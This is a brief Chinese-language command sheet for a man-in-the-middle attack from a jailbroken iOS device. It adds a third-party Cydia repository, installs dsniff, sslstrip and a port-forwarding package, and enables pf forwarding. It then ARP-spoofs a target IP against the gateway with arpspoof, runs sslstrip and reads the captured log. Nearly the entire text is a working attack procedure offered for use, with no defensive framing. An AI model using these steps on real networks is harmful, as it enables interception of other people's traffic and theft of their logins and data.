cydia 添加源
www.starwarsfan2099.x10host.com/repo

安裝套件
SSLstrip、Dsniff Suite、Port Forwarding

終端機安裝命令
添加源
# echo "deb http://www.starwarsfan2099.x10host.com/repo/ ./" >> /etc/apt/sources.list.d/cydia.list
# apt-get update
安裝套件
# apt-get install dsniff sslstrip portfowarding.package

端口轉發
# pfctl -e -f /etc/pf_ssl.conf

查看網關IP
# netstat -nr

ARP欺騙
用法 -i (interface) -t (target) (gateway)
# arpspoof -i en0 -t 192.168.254.46 192.168.254.254

打開新窗口
# sslstrip

查看擷取數據
# cat sslstrip.log
